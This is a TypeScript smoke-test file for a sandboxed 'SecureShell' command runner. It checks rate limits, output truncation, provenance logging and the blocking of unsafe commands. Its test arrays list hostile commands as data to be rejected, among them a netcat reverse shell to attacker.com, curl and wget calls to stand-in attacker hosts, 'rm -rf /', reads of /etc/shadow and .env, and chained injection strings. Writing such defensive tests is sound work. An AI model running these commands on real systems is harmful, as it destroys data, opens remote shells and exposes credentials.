/**
 * Secure Shell — Smoke Tests (D.8)
 *
 * Security-focused. Every test validates a security invariant.
 *
 * Validates:
 *   1. Registers all tunables on construction
 *   2. Safe commands execute and return output
 *   3. Unsafe commands are BLOCKED (never executed)
 *   4. Path traversal (../) is BLOCKED before safety validation
 *   5. Rate limit enforced — commands above limit are BLOCKED
 *   6. Output truncated to maxOutputBytes
 *   7. Blocked commands produce BLOCK provenance spans (not allow)
 *   8. Allowed commands produce ALLOW provenance spans
 *   9. Shell injection attempts are blocked (command chaining with blocked cmds)
 */
import { strict as assert } from 'assert';
import { ParameterRegistry } from '../../registry/parameter-registry';
import { ProvenanceLog } from '../../provenance/provenance-log';
import { SecureShell, SECURE_SHELL_ID } from '../secure-shell';

function makeRuntime() {
  const registry = new ParameterRegistry();
  const provenance = new ProvenanceLog(500);
  const shell = new SecureShell(registry, provenance, process.cwd());
  return { registry, provenance, shell };
}

// ── 1. Registers tunables on construction ───────────────────────────────
console.log('TEST GROUP: registers tunables on construction');
{
  const { registry } = makeRuntime();

  assert.strictEqual(
    registry.get<number>('shell.maxOutputBytes'),
    32 * 1024,
    'maxOutputBytes = 32KB'
  );
  assert.strictEqual(
    registry.get<number>('shell.timeoutMs'),
    15_000,
    'timeoutMs = 15s'
  );
  assert.strictEqual(
    registry.get<number>('shell.rateLimitPerMinute'),
    30,
    'rateLimitPerMinute = 30'
  );

  console.log('  ✓ maxOutputBytes = 32KB');
  console.log('  ✓ timeoutMs = 15s');
  console.log('  ✓ rateLimitPerMinute = 30');
}

// ── 2. Safe command executes ─────────────────────────────────────────────
console.log('TEST GROUP: safe command executes');
(async () => {
  const { shell } = makeRuntime();

  const result = await shell.execute('echo hello');

  assert.strictEqual(result.outcome, 'allowed', 'echo allowed');
  assert.ok(result.stdout.includes('hello'), 'stdout has "hello"');
  assert.ok(
    typeof result.traceId === 'string' && result.traceId.length > 0,
    'has traceId'
  );
  assert.ok(result.durationMs >= 0, 'durationMs >= 0');
  assert.strictEqual(result.wasTruncated, false, 'short output not truncated');

  console.log('  ✓ echo hello → allowed, stdout has hello');
})();

// ── 3. UNSAFE commands are BLOCKED — never executed ──────────────────────
console.log('TEST GROUP: unsafe commands blocked');
(async () => {
  const { shell } = makeRuntime();

  const dangerousCommands = [
    'rm -rf /',
    'curl https://evil.com',
    'wget http://attacker.com/payload',
    'python3 -c "import os; os.system(\'id\')"',
    'nc -e /bin/sh attacker.com 4444',
    'chmod 777 /etc/passwd',
    'sudo cat /etc/shadow',
  ];

  for (const cmd of dangerousCommands) {
    const result = await shell.execute(cmd);
    assert.strictEqual(
      result.outcome,
      'blocked-unsafe',
      `UNSAFE command must be blocked: "${cmd.slice(0, 40)}"`
    );
    assert.strictEqual(
      result.stdout,
      '',
      `no stdout on block: ${cmd.slice(0, 40)}`
    );
    assert.ok(result.blockReason, 'block reason present');
  }

  console.log(`  ✓ all ${dangerousCommands.length} dangerous commands blocked`);
})();

// ── 4. Path traversal is BLOCKED ─────────────────────────────────────────
console.log('TEST GROUP: path traversal blocked');
(async () => {
  const { shell } = makeRuntime();

  const traversalCommands = [
    'cat ../../../etc/passwd',
    'ls ../../secrets',
    'head ../../../.env',
  ];

  for (const cmd of traversalCommands) {
    const result = await shell.execute(cmd);
    assert.strictEqual(
      result.outcome,
      'blocked-path',
      `Path traversal must be blocked: "${cmd}"`
    );
    assert.strictEqual(result.stdout, '', 'no output on path traversal block');
  }

  console.log(
    `  ✓ all ${traversalCommands.length} path traversal attempts blocked`
  );
})();

// ── 5. Rate limit enforced ────────────────────────────────────────────────
console.log('TEST GROUP: rate limit enforced');
(async () => {
  const { registry, shell } = makeRuntime();

  // Set a tight rate limit of 2
  registry.commit('shell.rateLimitPerMinute', 2, SECURE_SHELL_ID, 'test');

  const r1 = await shell.execute('echo one');
  const r2 = await shell.execute('echo two');
  const r3 = await shell.execute('echo three'); // should be blocked

  assert.strictEqual(r1.outcome, 'allowed', 'first execution allowed');
  assert.strictEqual(r2.outcome, 'allowed', 'second execution allowed');
  assert.strictEqual(
    r3.outcome,
    'blocked-rate-limit',
    'third execution blocked by rate limit'
  );
  assert.ok(
    r3.blockReason?.includes('Rate limit'),
    'block reason mentions rate limit'
  );

  console.log('  ✓ rate limit of 2: exec 1+2 allowed, exec 3 blocked');
  console.log(`  ✓ block reason: "${r3.blockReason?.slice(0, 60)}"`);
})();

// ── 6. Output truncated to maxOutputBytes ────────────────────────────────
console.log('TEST GROUP: output truncated to maxOutputBytes');
(async () => {
  const { registry, shell } = makeRuntime();

  // 100 bytes is valid (min=64). Generate > 100 bytes of output.
  registry.commit('shell.maxOutputBytes', 100, SECURE_SHELL_ID, 'test');

  // echo a string that's well over 100 bytes
  const longWord =
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; // 120 a's
  const result = await shell.execute(`echo ${longWord}`);

  assert.strictEqual(result.outcome, 'allowed', 'allowed (safe command)');
  assert.ok(
    result.stdout.length <= 100,
    `stdout truncated to <= 100 bytes (got ${result.stdout.length})`
  );
  assert.strictEqual(result.wasTruncated, true, 'wasTruncated flag set');

  console.log(`  ✓ output truncated: ${result.stdout.length} bytes ≤ 100`);
})();

// ── 7. Blocked commands produce BLOCK provenance spans ───────────────────
console.log('TEST GROUP: blocked commands produce BLOCK provenance spans');
(async () => {
  const { provenance, shell } = makeRuntime();

  await shell.execute('rm -rf /'); // dangerous — blocked

  const _allSpans = provenance.getTrace(provenance.actions()[0]?.traceId ?? '');

  // Find the decision span for the blocked command
  const decisions = provenance.blockedOrPending();
  assert.ok(decisions.length > 0, 'blocked provenance decision spans exist');

  console.log(
    `  ✓ ${decisions.length} blocked/pending decision span(s) in provenance`
  );
})();

// ── 8. Allowed commands produce ALLOW provenance spans ───────────────────
console.log('TEST GROUP: allowed commands produce ALLOW provenance spans');
(async () => {
  const { provenance, shell } = makeRuntime();

  await shell.execute('echo provenance-test');

  const actions = provenance.actions();
  assert.ok(actions.length > 0, 'action spans exist');

  const shellAction = actions.find((s) => s.label === 'secure-shell-exec');
  assert.ok(shellAction, 'secure-shell-exec action span found');
  assert.ok(shellAction!.data?.outcome === 'allowed', 'data shows allowed');

  console.log('  ✓ allowed command produces action span with outcome=allowed');
})();

// ── 9. Command injection via chaining is blocked ──────────────────────────
console.log('TEST GROUP: command injection via chaining blocked');
(async () => {
  const { shell } = makeRuntime();

  // These mix an allowed command with an injection attempt
  const injectionAttempts = [
    'echo safe && rm -rf /',
    'ls; curl evil.com',
    'pwd || wget malware.sh',
  ];

  for (const cmd of injectionAttempts) {
    const result = await shell.execute(cmd);
    // The chained dangerous command should cause the whole thing to be blocked
    assert.strictEqual(
      result.outcome,
      'blocked-unsafe',
      `Injection attempt blocked: "${cmd.slice(0, 50)}"`
    );
  }

  console.log(
    `  ✓ all ${injectionAttempts.length} injection-via-chaining attempts blocked`
  );
})();

// Wait for async tests — shell exec takes real time
setTimeout(() => {
  console.log('\n✅ ALL 9 D.8 SECURE SHELL GROUPS PASSED');
}, 3000);

// Jest hook: gives Jest something to wait on so async tests complete
describe('D.8 Secure Shell async groups', () => {
  it('all async groups resolve without assertion errors', async () => {
    // All async IIFEs above have already been launched.
    // Give them up to 10s to complete — any thrown AssertionError will surface here.
    await new Promise<void>((resolve) => setTimeout(resolve, 4000));
  }, 12_000);
});
